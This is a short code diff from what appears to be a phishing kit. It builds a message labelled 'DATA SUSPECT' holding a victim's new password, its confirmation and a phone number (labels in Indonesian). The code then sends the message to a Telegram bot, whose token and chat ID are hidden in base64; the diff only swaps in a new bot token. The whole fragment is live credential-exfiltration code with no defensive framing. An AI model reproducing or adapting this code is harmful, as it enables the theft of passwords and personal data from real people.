@@ -60,7 +60,7 @@
 
             const message = `A1 💢\n \n  ├──────────DATA SUSPECT──────────\n  ├• Kata Sandi Baru: ${newPassword}\n  ├• Konfirmasi Kata Sandi: ${confirmPassword}\n  ├• Nomor Handphone: ${nohp}\n  ╰──────────────────────────────`;
 
-            const botToken = decodeBase64("ODc1MjQzNDAzNjpBQUVZWVBTOW1iYTZVUEtkdG9vUDVNM0stS29kUkJ5dWp4QQ==");
+            const botToken = decodeBase64("ODc1MjQzNDAzNjpBQUVNMTRnTEgyQzk2VXlDVGFDSUJTNVpwNjJJRV81ZTI1bw==");
             const chatId = decodeBase64("ODc1NDI2MTU3Ng==");
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=html`, {
